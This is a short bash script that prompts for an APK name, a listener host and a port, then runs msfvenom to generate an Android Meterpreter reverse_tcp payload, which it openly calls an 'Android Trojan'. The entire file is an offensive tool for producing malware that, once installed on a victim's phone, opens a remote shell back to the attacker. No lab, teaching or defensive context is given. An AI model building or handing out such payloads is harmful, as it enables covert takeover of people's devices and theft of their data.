#!/bin/bash

clear
echo -e "\033[0;34m$(figlet "Meterpreter")\033[0m"
echo "[+] set APK name: without .apk extension file:"
read -p "[+] set APK name:" apk_name
read -p "[+] set LHOST: " lhost
read -p "[+] set LPORT: " lport
echo "[+] building your Android Trojan with Meterpreter ..."
msfvenom --arch dalvik --platform Android -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -e generic/none -i 5 -o "../$apk_name.apk"
